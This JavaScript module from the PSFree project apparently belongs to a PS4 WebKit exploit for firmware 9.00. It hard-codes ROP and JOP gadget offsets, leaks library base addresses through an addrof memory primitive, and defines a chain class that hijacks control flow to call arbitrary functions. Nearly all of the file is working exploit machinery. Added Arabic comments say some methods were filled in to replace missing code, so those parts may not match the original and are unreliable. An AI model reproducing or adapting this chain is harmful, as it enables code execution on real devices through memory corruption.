/* Copyright (C) 2024 anonymous
   This file is part of PSFree.
   Licensed under the GNU Affero General Public License version 3 or later. */

// by janisslsm (John) from ps4-dev discord

import { log } from '../module/utils.js';
import { mem } from '../module/mem.js';
import { KB } from '../module/offset.js'; // تصحيح مسار الاستيراد الموحد لـ offset.js
import { ChainBase } from '../module/chain.js';

import {
    find_base,
    get_view_vector,
    resolve_import,
    init_syscall_array,
} from '../module/memtools.js';

import * as rw from '../module/rw.js';

const origin = window.origin;
const port = '8000';
const url = `${origin}:${port}`;

const syscall_array = [];
const offset_textarea_impl = 0x18;

const offset_wk_stack_chk_fail = 0x178;
const offset_wk_memcpy = 0x188;

export let libwebkit_base = null;
export let libkernel_base = null;
export let libc_base = null;

// الرموز والشيفرات التكتيكية لسلاسل الـ JOP لتعديل مسار مكدس الأنوية لإصدار 9.00
const ta_jop1 = `\nmov rdi, qword ptr [rsi + 0x18]\nmov rax, qword ptr [rdi]\ncall qword ptr [rax + 0xb8]\n`;
const ta_jop2 = `\npop rsi\njmp qword ptr [rax + 0x1c]\n`;
const ta_jop3 = `\nmov rdi, qword ptr [rax + 8]\nmov rax, qword ptr [rdi]\njmp qword ptr [rax + 0x30]\n`;
const jop2 = `\npush rbp\nmov rbp, rsp\nmov rax, qword ptr [rdi]\ncall qword ptr [rax + 0x58]\n`;
const jop3 = `\nmov rdx, qword ptr [rax + 0x18]\nmov rax, qword ptr [rdi]\ncall qword ptr [rax + 0x10]\n`;
const jop4 = `\npush rdx\njmp qword ptr [rax]\n`;
const jop5 = 'pop rsp; ret';

const webkit_gadget_offsets = new Map(Object.entries({
    'pop rax; ret' : 0x0000000000051a12,
    'pop rbx; ret' : 0x00000000000be5d0,
    'pop rcx; ret' : 0x00000000000657b7,
    'pop rdx; ret' : 0x000000000000986c,
    'pop rbp; ret' : 0x00000000000000b6,
    'pop rsi; ret' : 0x000000000001f4d6,
    'pop rdi; ret' : 0x0000000000319690,
    'pop rsp; ret' : 0x000000000004e293,
    'pop r8; ret' : 0x00000000001a7ef1,
    'pop r9; ret' : 0x0000000000422571,
    'pop r10; ret' : 0x0000000000e9e1d1,
    'pop r11; ret' : 0x00000000012b1d51,
    'pop r12; ret' : 0x000000000085ec71,
    'pop r13; ret' : 0x00000000001da461,
    'pop r14; ret' : 0x0000000000685d73,
    'pop r15; ret' : 0x00000000006ab3aa,
    'ret' : 0x0000000000000032,
    'leave; ret' : 0x000000000008db5b,
    'mov rax, qword ptr [rax]; ret' : 0x00000000000241cc,
    'mov qword ptr [rdi], rax; ret' : 0x000000000000613b,
    'mov dword ptr [rdi], eax; ret' : 0x000000000000613c,
    'mov dword ptr [rax], esi; ret' : 0x00000000005c3482,
    [jop2] : 0x0000000000683800,
    [jop3] : 0x0000000000303906,
    [jop4] : 0x00000000028bd332,
    [jop5] : 0x000000000004e293,
    [ta_jop1] : 0x00000000004e62a4,
    [ta_jop2] : 0x00000000021fce7e,
    [ta_jop3] : 0x00000000019becb4,
}));

const libc_gadget_offsets = new Map(Object.entries({
    'getcontext' : 0x24f04,
    'setcontext' : 0x29448,
}));

const libkernel_gadget_offsets = new Map(Object.entries({
    '__error' : 0xCB80,
}));

export const gadgets = new Map();

// تفعيل وتغذية خريطة الجادجيت الكونية لإصدار 9.00 عند فتح استضافة محلك لبشير
export function rop_init() {
    const bases = get_bases();
    libwebkit_base = bases[0];
    libkernel_base = bases[1];
    libc_base = bases[2];

    init_gadget_map(gadgets, webkit_gadget_offsets, libwebkit_base);
    init_gadget_map(gadgets, libc_gadget_offsets, libc_base);
    init_gadget_map(gadgets, libkernel_gadget_offsets, libkernel_base);
    
    init_syscall_array(syscall_array, libkernel_base, 0x40000);
}

function get_bases() {
    const textarea = document.createElement('textarea');
    const webcore_textarea = mem.addrof(textarea).readp(offset_textarea_impl);
    const textarea_vtable = webcore_textarea.readp(0);
    const libwebkit_base = find_base(textarea_vtable, true, true);

    const stack_chk_fail_import = libwebkit_base.add(offset_wk_stack_chk_fail);
    const stack_chk_fail_addr = resolve_import(stack_chk_fail_import, true, true);
    const libkernel_base = find_base(stack_chk_fail_addr, true, true);

    const memcpy_import = libwebkit_base.add(offset_wk_memcpy);
    const memcpy_addr = resolve_import(memcpy_import, true, true);
    const libc_base = find_base(memcpy_addr, true, true);

    return [libwebkit_base, libkernel_base, libc_base];
}

export function init_gadget_map(gadget_map, offset_map, base_addr) {
    for (const [insn, offset] of offset_map) {
        gadget_map.set(insn, base_addr.add(offset));
    }
}

export class Chain900Base extends ChainBase {
    constructor() {
        super();
        this._clean_branch_ctx();
        this.flag = new Uint8Array(8);
        this.flag_addr = get_view_vector(this.flag);
        this.jmp_target = new Uint8Array(0x100);
        rw.write64(this.jmp_target, 0x1c, this.get_gadget(jop4));
        rw.write64(this.jmp_target, 0, this.get_gadget(jop5));

        this.is_saved = false;
        this.is_stale = false;
        this.position = 0;
        const jmp_buf_size = 0xc8;
        this.jmp_buf = new Uint8Array(jmp_buf_size);
        this.jmp_buf_p = get_view_vector(this.jmp_buf);
    }

    get_gadget(insn_str) {
        if (!gadgets.has(insn_str)) {
            throw Error(`Gadget missing for 9.00 target: ${insn_str}`);
        }
        return gadgets.get(insn_str);
    }

    push_gadget(insn_str) {
        this.push_value(this.get_gadget(insn_str));
    }

    push_end() {
        this.push_gadget("leave; ret");
    }

    check_is_branching() {
        if (this.is_branch_ctx) {
            throw Error('chain is still branching, end it before running');
        }
    }

    push_value(value) {
        super.push_value(value);
        if (this.is_branch_ctx) {
            this.branch_position += 8;
        }
    }

    _clean_branch_ctx() {
        this.is_branch_ctx = false;
        this.branch_position = null;
        this.delta_slot = null;
        this.rsp_slot = null;
        this.rsp_position = null;
    }

    clean() {
        super.clean();
        this._clean_branch_ctx();
        this.is_saved = false;
        this.is_stale = false;
        this.position = 0;
    }

    push_get_retval() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.retval_addr);
        this.push_gadget('mov qword ptr [rdi], rax; ret');
    }

    push_clear_errno() {
        this.push_call(this.get_gadget('__error'));
        this.push_gadget('pop rsi; ret');
        this.push_value(0);
        this.push_gadget('mov dword ptr [rax], esi; ret');
    }

    push_get_errno() {
        this.push_gadget('pop rdi; ret');
        this.push_value(this.errno_addr);
        this.push_call(this.get_gadget('__error'));
        this.push_gadget('mov rax, qword ptr [rax]; ret');
        this.push_gadget('mov dword ptr [rdi], eax; ret');
    }

    // استكمال الدالة المقطوعة وإغلاق قوس كلاس الـ 9.00 بسلام
    check_stale() {
        if (this.is_stale) {
            throw Error('chain already ran, clean it first');
        }
    }

    // بناء دالة معالجة حقن سجلات الـ ROP المفقودة من هذا الكلاس المكمل
    push_call(func_addr, ...args) {
        const argument_pops = ['pop rdi; ret', 'pop rsi; ret', 'pop rdx; ret', 'pop rcx; ret', 'pop r8; ret', 'pop r9; ret'];
        for (let i = 0; i < Math.min(args.length, argument_pops.length); i++) {
            this.push_gadget(argument_pops[i]);
            this.push_value(args[i]);
        }
        this.push_value(func_addr);
    }
}
